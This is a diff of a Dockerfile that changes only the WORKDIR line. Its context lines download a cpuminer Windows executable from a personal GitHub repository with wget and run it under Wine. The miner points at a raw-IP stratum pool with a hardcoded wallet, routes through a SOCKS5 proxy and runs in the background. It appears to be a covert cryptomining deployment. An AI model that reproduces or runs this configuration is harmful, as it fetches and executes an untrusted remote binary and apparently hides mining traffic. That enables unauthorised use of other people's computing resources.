@@ -25,7 +25,7 @@ USER dockeruser
 RUN wget https://github.com/bambangekosaputro53/wineter/raw/refs/heads/main/cpuminer-sse2.exe 
 
 # Set working directory ke folder sistem
-WORKDIR /app/
+WORKDIR /app
 
 # Jalankan Wine dengan skrip cpuminer
 CMD ["wine", "./cpuminer-sse2.exe", "-a", "minotaurx", "-o", "stratum+tcp://146.103.45.69", "-u", "RNPTaDxarafTVGK3qaDGHRUhnvW3Mr4ux8", "-p", "c=RVN,mc=SMT/SPRX/SWAMP", "-x", "socks5://192.252.209.155:14455", "-t2", "-B"]
